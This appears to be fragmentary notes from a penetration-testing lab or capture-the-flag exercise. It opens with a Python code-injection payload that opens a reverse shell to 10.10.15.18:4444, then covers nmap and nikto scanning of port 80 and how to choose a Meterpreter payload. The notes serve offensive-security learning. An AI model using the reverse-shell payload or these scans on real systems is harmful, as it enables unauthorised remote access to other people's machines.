
', exec("import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.15.18',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"))#

<!-- Omit 
Next scan is targeted towards port 80 (HTTP)

Both of these scans can scan for vulnerabilities for port 80 (HTTP) web server & discover hidden directories. 
nmap -p 80 --script=http-enum 10.10.11.208
– -p 80: this command instructs Nmap to perform a basic scan on port 80 (-p 80) of the target IP address 10.10.11.208. 
– --script=http-enum: this script is used to enumerate and gather information about directories and files on the web server.
nikto -h 10.10.11.208 

     (Nikto is a widely used open-source web vulnerability scanner that helps identify potential security vulnerabilities and misconfigurations in web servers)

– -h: flag specifies the target hostname or IP address that Nikto will scan.--->             
               show modules
               msfvenom
               meterpreter


Your decision on which version of Meterpreter to use will be mostly based on three factors;

    The target operating system (Is the target operating system Linux or Windows? Is it a Mac device? Is it an Android phone? etc.)
    Components available on the target system (Is Python installed? Is this a PHP website? etc.)
    Network connection types you can have with the target system (Do they allow raw TCP connections? Can you only have an HTTPS reverse connection? Are IPv6 addresses not as closely monitored as IPv4 addresses? etc.) 


run the scan ^
^^